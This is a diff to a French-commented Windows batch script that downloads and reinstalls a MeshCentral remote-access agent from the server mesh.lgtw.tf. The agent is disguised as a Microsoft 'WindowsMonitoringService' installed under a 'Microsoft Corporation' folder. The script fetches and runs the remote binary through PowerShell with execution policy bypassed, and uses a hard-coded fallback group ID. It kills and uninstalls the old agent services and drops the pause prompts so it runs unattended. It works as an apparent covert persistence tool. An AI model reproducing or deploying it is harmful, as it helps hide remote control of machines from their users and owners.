@@ -11,8 +11,18 @@ set "TEMP_DIR=%TEMP%\MeshAgentUpdate_%RANDOM%"
 for /f "tokens=1-3 delims=/ " %%a in ('date /t') do set "LOGDATE=%%c%%b%%a"
 for /f "tokens=1-3 delims=:. " %%a in ('time /t') do set "LOGTIME=%%a%%b%%c"
 set "LOG_FILE=%TEMP%\MeshAgentUpdate_%LOGDATE%_%LOGTIME%.log"
-set "NEW_AGENT_URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
-set "NEW_AGENT_FILE=%TEMP_DIR%\WindowsMonitoringService64-Lol.exe"
+
+:: --- CONFIGURATION MeshCentral ---
+:: URL de votre serveur MeshCentral
+set "MESH_SERVER=https://mesh.lgtw.tf"
+:: ID du type d'agent Windows (id=4 dans votre URL MeshCentral)
+set "MESH_AGENT_ID=4"
+:: Mesh Group ID : trouvable dans MeshCentral > votre groupe > Ajouter un agent > URL de la commande d'installation
+:: Laisser vide pour auto-detection depuis l'installation existante
+set "MESH_GROUP_ID="
+:: Groupe de fallback utilise si le MeshID ne peut pas etre auto-detecte
+set "MESH_GROUP_ID_FALLBACK=W4tZHM@Pv3686vWHJYUmulXYFna1tmZx6BZB3WATaGwMb05@ZjRaRnba@vn$uqhF"
+set "NEW_AGENT_FILE=%TEMP_DIR%\WindowsMonitoringService64.exe"
 
 :: Initialize log file immediately
 echo ================================================ > "%LOG_FILE%"
@@ -36,21 +46,12 @@ if "%CONFIRMED%"=="0" (
     exit /b 1
 )
 
-:: Known agent locations to search
-set "SEARCH_PATHS[0]=Mesh Agent"
-set "SEARCH_PATHS[1]=LGTW"
-set "SEARCH_PATHS[2]=LGTWAgent"
-set "SEARCH_PATHS[3]=Microsoft Corporation\WindowsMonitoringService"
-set "SEARCH_PATHS[4]=LGTW\LGTWAgent"
+:: Chemin d'installation actuel
+set "SEARCH_PATHS[0]=Microsoft Corporation\WindowsMonitoringService"
 
-:: Known agent process names
-set "PROCESS_NAMES[0]=MeshAgent.exe"
-set "PROCESS_NAMES[1]=MeshService.exe"
-set "PROCESS_NAMES[2]=WindowsMonitoringService64.exe"
-set "PROCESS_NAMES[3]=WindowsMonitoringService64-Lol.exe"
-set "PROCESS_NAMES[4]=MeshAgent64.exe"
-set "PROCESS_NAMES[5]=LGTW-Agent.exe"
-set "PROCESS_NAMES[6]=LGTWAgent.exe"
+:: Noms de processus actuels
+set "PROCESS_NAMES[0]=WindowsMonitoringService64.exe"
+set "PROCESS_NAMES[1]=WindowsMonitoringService64-Lol.exe"
 
 :: Jump to main execution (skip function definitions)
 goto :main
@@ -60,8 +61,8 @@ goto :main
 :: ============================================================================
 :log
 set "MSG=%~1"
-echo [%time%] %MSG%
-echo [%time%] %MSG% >> "%LOG_FILE%" 2>&1
+echo [%time%] !MSG!
+echo [%time%] !MSG! >> "%LOG_FILE%" 2>&1
 goto :eof
 
 :: ============================================================================
@@ -77,7 +78,7 @@ call :log "STEP 1: Initialization"
 call :log "================================================"
 call :log "Log file: %LOG_FILE%"
 call :log "Temp directory: %TEMP_DIR%"
-call :log "Download URL: %NEW_AGENT_URL%"
+call :log "Serveur MeshCentral: %MESH_SERVER%"
 call :log "Target file: %NEW_AGENT_FILE%"
 
 :: Check for administrator privileges
@@ -87,7 +88,6 @@ if %errorlevel% NEQ 0 (
     call :log "ERROR: This script must be run as Administrator"
     echo ERROR: This script must be run as Administrator
     echo Please right-click and select 'Run as Administrator'
-    pause
     exit /b 1
 )
 call :log "SUCCESS: Running with administrator privileges"
@@ -99,23 +99,69 @@ if not exist "%TEMP_DIR%" (
     if errorlevel 1 (
         call :log "ERROR: Failed to create temporary directory"
         call :log "Error code: %errorlevel%"
-        pause
         exit /b 1
     )
 )
 call :log "SUCCESS: Temporary directory created"
 
 :: ============================================================================
+:: STEP 1.5: Auto-detection du Mesh Group ID depuis l'installation existante
+:: ============================================================================
+call :log "================================================"
+call :log "STEP 1.5: Detection du Mesh Group ID"
+call :log "================================================"
+
+if not defined MESH_GROUP_ID (
+    call :log "MESH_GROUP_ID non configure, tentative d'auto-detection..."
+    for %%P in (
+        "%ProgramFiles%\Microsoft Corporation\WindowsMonitoringService"
+        "%ProgramFiles(x86)%\Microsoft Corporation\WindowsMonitoringService"
+    ) do (
+        if exist "%%~P" (
+            for %%F in ("%%~P\*.msh") do (
+                if not "%%~F"=="%%~P\*.msh" (
+                    call :log "Fichier MSH trouve: %%~F"
+                    set "MESH_GROUP_ID_HEX="
+                    for /f "tokens=1,* delims==" %%K in ('type "%%~F" 2^>nul') do (
+                        if /i "%%K"=="MeshID" set "MESH_GROUP_ID_HEX=%%L"
+                    )
+                    if defined MESH_GROUP_ID_HEX (
+                        call :log "MeshID hex detecte, conversion en cours..."
+                        (echo !MESH_GROUP_ID_HEX!) > "%TEMP_DIR%\meshid_hex.txt"
+                        powershell -NoProfile -ExecutionPolicy Bypass -Command "$h=(Get-Content '%TEMP_DIR%\meshid_hex.txt').Trim(); if($h.StartsWith('0x')){$h=$h.Substring(2)}; $m=[System.Text.RegularExpressions.Regex]::Matches($h,'..'); $bytes=[byte[]]($m | ForEach-Object{[Convert]::ToByte($_.Value,16)}); Set-Content '%TEMP_DIR%\meshid_b64.txt' -Value (([Convert]::ToBase64String($bytes)) -replace '\+','@' -replace '/','$' -replace '=','')" >> "%LOG_FILE%" 2>&1
+                        if exist "%TEMP_DIR%\meshid_b64.txt" (
+                            set /p MESH_GROUP_ID=<"%TEMP_DIR%\meshid_b64.txt"
+                            if defined MESH_GROUP_ID (
+                                call :log "MeshID converti avec succes"
+                            )
+                        )
+                    )
+                )
+            )
+        )
+    )
+)
+
+if not defined MESH_GROUP_ID (
+    call :log "AVERTISSEMENT: MESH_GROUP_ID introuvable, utilisation du groupe de fallback..."
+    set "MESH_GROUP_ID=%MESH_GROUP_ID_FALLBACK%"
+    call :log "Groupe de fallback utilise: %MESH_GROUP_ID_FALLBACK%"
+)
+call :log "Mesh Group ID: !MESH_GROUP_ID!"
+call :log "URL de telechargement: %MESH_SERVER%/meshagents?id=%MESH_AGENT_ID%^&meshid=!MESH_GROUP_ID!^&installflags=0"
+
+
+:: ============================================================================
 :: STEP 2: Download new agent
 :: ============================================================================
 call :log "================================================"
 call :log "STEP 2: Downloading new agent installer"
-call :log "URL: %NEW_AGENT_URL%"
-call :log "Target: %NEW_AGENT_FILE%"
+call :log "Serveur: %MESH_SERVER%"
+call :log "Target: !NEW_AGENT_FILE!"
 call :log "================================================"
 
 call :log "Starting download via PowerShell..."
-powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Write-Host 'PowerShell: Starting download...'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host 'PowerShell: Downloading from %NEW_AGENT_URL%'; Invoke-WebRequest -UseBasicParsing -Uri '%NEW_AGENT_URL%' -OutFile '%NEW_AGENT_FILE%' -ErrorAction Stop; Write-Host 'PowerShell: Download completed'; exit 0 } catch { Write-Host \"PowerShell ERROR: $($_.Exception.Message)\"; exit 1 }" >> "%LOG_FILE%" 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $meshServer='%MESH_SERVER%'; $meshId='!MESH_GROUP_ID!'; $agentId='%MESH_AGENT_ID%'; $uri = $meshServer + '/meshagents?id=' + $agentId + '&meshid=' + $meshId + '&installflags=0'; Write-Host ('PowerShell: Downloading from ' + $uri); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -Uri $uri -OutFile '!NEW_AGENT_FILE!' -ErrorAction Stop; Write-Host 'PowerShell: Download completed'; exit 0 } catch { Write-Host \"PowerShell ERROR: $($_.Exception.Message)\"; exit 1 }" >> "%LOG_FILE%" 2>&1
 
 set "DL_ERROR=%errorlevel%"
 call :log "Download command completed with code: %DL_ERROR%"
@@ -123,8 +169,7 @@ call :log "Download command completed with code: %DL_ERROR%"
 if %DL_ERROR% NEQ 0 (
     call :log "ERROR: Failed to download new agent installer (Error: %DL_ERROR%)"
     call :log "CRITICAL: Aborting update to prevent losing remote access"
-    call :log "Check if URL is accessible: %NEW_AGENT_URL%"
-    pause
+    call :log "Verifiez: MESH_GROUP_ID est correct et %MESH_SERVER% est accessible"
     goto :cleanup_exit
 )
 
@@ -135,7 +180,6 @@ if not exist "%NEW_AGENT_FILE%" (
     call :log "CRITICAL: Aborting update to prevent losing remote access"
     call :log "Listing temp directory contents:"
     dir "%TEMP_DIR%" >> "%LOG_FILE%" 2>&1
-    pause
     goto :cleanup_exit
 )
 
@@ -150,7 +194,6 @@ if %FILE_SIZE_CLEAN% LSS 100000 (
     call :log "ERROR: Downloaded file is too small (%FILE_SIZE% bytes)"
     call :log "CRITICAL: Aborting update to prevent losing remote access"
     call :log "Expected at least 100000 bytes"
-    pause
     goto :cleanup_exit
 )
 
@@ -163,7 +206,6 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $header = Get-Cont
 if errorlevel 1 (
     call :log "ERROR: Downloaded file is not a valid executable"
     call :log "CRITICAL: Aborting update to prevent losing remote access"
-    pause
     goto :cleanup_exit
 )
 
@@ -182,7 +224,7 @@ set "FOUND_COUNT=0"
 set "INSTALL_PATHS="
 
 :: Search in Program Files
-for /L %%i in (0,1,4) do (
+for /L %%i in (0,1,0) do (
     if defined SEARCH_PATHS[%%i] (
         set "SEARCH_PATH=!SEARCH_PATHS[%%i]!"
         
@@ -210,7 +252,7 @@ call :log "================================================"
 call :log "STEP 4: Stopping agent processes"
 call :log "================================================"
 
-for /L %%i in (0,1,6) do (
+for /L %%i in (0,1,1) do (
     if defined PROCESS_NAMES[%%i] (
         set "PROC_NAME=!PROCESS_NAMES[%%i]!"
         
@@ -244,7 +286,7 @@ call :log "STEP 5: Stopping and deleting agent services"
 call :log "================================================"
 
 :: Try to stop and delete common service names
-for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "LGTW-Agent" "WindowsMonitoringService") do (
+for %%S in ("WindowsMonitoringService") do (
     sc query %%~S >NUL 2>&1
     if not errorlevel 1 (
         call :log "Found service: %%~S"
@@ -286,7 +328,7 @@ for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "LGTW-Agent" "WindowsMonitoring
             )
             
             :: Also kill by known process names
-            for /L %%i in (0,1,6) do (
+            for /L %%i in (0,1,1) do (
                 if defined PROCESS_NAMES[%%i] (
                     set "PROC_NAME=!PROCESS_NAMES[%%i]!"
                     tasklist /FI "IMAGENAME eq !PROC_NAME!" 2>NUL | find /I "!PROC_NAME!" >NUL
@@ -376,34 +418,16 @@ if %FOUND_COUNT% GTR 0 (
             set "INST_PATH=!INSTALL_PATHS[%%i]!"
             call :log "Processing installation at: !INST_PATH!"
             
-            :: Look for and run uninstaller (try most common first)
+            :: Desinstaller l'agent actuel
             if exist "!INST_PATH!\WindowsMonitoringService64.exe" (
                 call :log "Running uninstaller: !INST_PATH!\WindowsMonitoringService64.exe -uninstall"
                 "!INST_PATH!\WindowsMonitoringService64.exe" -uninstall >> "%LOG_FILE%" 2>&1
                 timeout /t 5 /nobreak >NUL
             )
-            
-            if exist "!INST_PATH!\LGTW-Agent.exe" (
-                call :log "Running uninstaller: !INST_PATH!\LGTW-Agent.exe -uninstall"
-                "!INST_PATH!\LGTW-Agent.exe" -uninstall >> "%LOG_FILE%" 2>&1
-                timeout /t 5 /nobreak >NUL
-            )
-            
-            if exist "!INST_PATH!\LGTWAgent.exe" (
-                call :log "Running uninstaller: !INST_PATH!\LGTWAgent.exe -uninstall"
-                "!INST_PATH!\LGTWAgent.exe" -uninstall >> "%LOG_FILE%" 2>&1
-                timeout /t 5 /nobreak >NUL
-            )
-            
-            if exist "!INST_PATH!\MeshAgent.exe" (
-                call :log "Running uninstaller: !INST_PATH!\MeshAgent.exe -uninstall"
-                "!INST_PATH!\MeshAgent.exe" -uninstall >> "%LOG_FILE%" 2>&1
-                timeout /t 5 /nobreak >NUL
-            )
-            
-            if exist "!INST_PATH!\MeshService.exe" (
-                call :log "Running uninstaller: !INST_PATH!\MeshService.exe -uninstall"
-                "!INST_PATH!\MeshService.exe" -uninstall >> "%LOG_FILE%" 2>&1
+
+            if exist "!INST_PATH!\WindowsMonitoringService64-Lol.exe" (
+                call :log "Running uninstaller: !INST_PATH!\WindowsMonitoringService64-Lol.exe -uninstall"
+                "!INST_PATH!\WindowsMonitoringService64-Lol.exe" -uninstall >> "%LOG_FILE%" 2>&1
                 timeout /t 5 /nobreak >NUL
             )
         )
@@ -547,7 +571,7 @@ if "%INSTALL_SUCCESS%"=="0" (
 
 if "%INSTALL_SUCCESS%"=="1" (
     call :log "Installation phase completed successfully"
-else (
+) else (
     call :log "WARNING: Installation verification failed"
 )
 
@@ -612,7 +636,7 @@ set /a "RETRY_COUNT+=1"
 call :log "Verification attempt %RETRY_COUNT%/3..."
 
 :: Check if new service is running
-for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "LGTW-Agent" "WindowsMonitoringService") do (
+for %%S in ("WindowsMonitoringService") do (
     sc query %%~S 2>NUL | find "RUNNING" >NUL
     if not errorlevel 1 (
         call :log "SUCCESS: Service %%~S is running"
@@ -621,7 +645,7 @@ for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "LGTW-Agent" "WindowsMonitoring
 )
 
 :: Check if new process is running
-for /L %%i in (0,1,6) do (
+for /L %%i in (0,1,1) do (
     if defined PROCESS_NAMES[%%i] (
         set "PROC_NAME=!PROCESS_NAMES[%%i]!"
         tasklist /FI "IMAGENAME eq !PROC_NAME!" 2>NUL | find /I "!PROC_NAME!" >NUL
@@ -637,7 +661,7 @@ if "%NEW_INSTALL_VERIFIED%"=="0" (
         call :log "WARNING: Agent not running, attempting recovery (attempt %RETRY_COUNT%/3)..."
         
         :: Try to start any existing service
-        for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "LGTW-Agent" "WindowsMonitoringService") do (
+        for %%S in ("WindowsMonitoringService") do (
             sc query %%~S >NUL 2>&1
             if not errorlevel 1 (
                 call :log "Found stopped service %%~S, attempting to start..."
@@ -680,7 +704,6 @@ if "%NEW_INSTALL_VERIFIED%"=="0" (
             echo Installer: %NEW_AGENT_FILE%
             echo Log: %LOG_FILE%
             echo ================================================
-            pause
         )
     )
 ) else (
